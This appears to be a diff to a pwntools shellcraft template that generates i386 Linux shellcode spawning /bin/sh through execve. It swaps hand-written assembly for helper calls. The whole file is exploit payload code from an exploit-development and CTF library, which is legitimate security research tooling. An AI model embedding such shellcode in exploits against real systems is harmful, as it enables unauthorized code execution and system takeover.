@@ -1,12 +1,7 @@
 <% from pwnlib.shellcraft import i386 %>
+<% from pwnlib.constants.linux.i386 import SYS_execve %>
 <%docstring>Execute /bin/sh</%docstring>
 
-    /*  Clear eax, ecx, edx */
-    xor ecx, ecx
-    imul ecx
+${i386.pushstr('/bin///sh')}
 
-    /*  Push '/bin//sh' */
-${i386.pushstr('/bin//sh')}
-
-    /*  Call execve("/bin//sh", 0, 0) */
-${i386.syscall('SYS_execve', 'esp', 'ecx', 'edx')}
+${i386.linux.syscall('SYS_execve', 'esp', 0, 0)}
